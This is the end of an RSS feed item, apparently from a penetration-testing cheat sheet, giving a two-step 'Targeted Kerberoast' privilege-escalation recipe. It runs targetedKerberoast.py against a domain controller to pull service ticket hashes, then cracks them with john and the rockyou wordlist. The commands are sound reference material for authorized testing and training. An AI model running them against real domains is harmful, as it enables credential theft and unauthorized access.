      <description>Privesc #1: Targeted Kerberoast Linux 1. Targeted Kerberoast # Password python3 targetedKerberoast.py -d &amp;#39;&amp;lt;DOMAIN&amp;gt;&amp;#39; -u &amp;#39;&amp;lt;USER&amp;gt;&amp;#39; -p &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; --dc-ip &amp;#39;&amp;lt;DC_IP&amp;gt;&amp;#39; 2. Hash Crack john --wordlist=/usr/share/wordlists/rockyou.txt &amp;lt;HASH_FILE&amp;gt; Ref: targetedKerberoast</description>
    </item>
  </channel>
</rss>
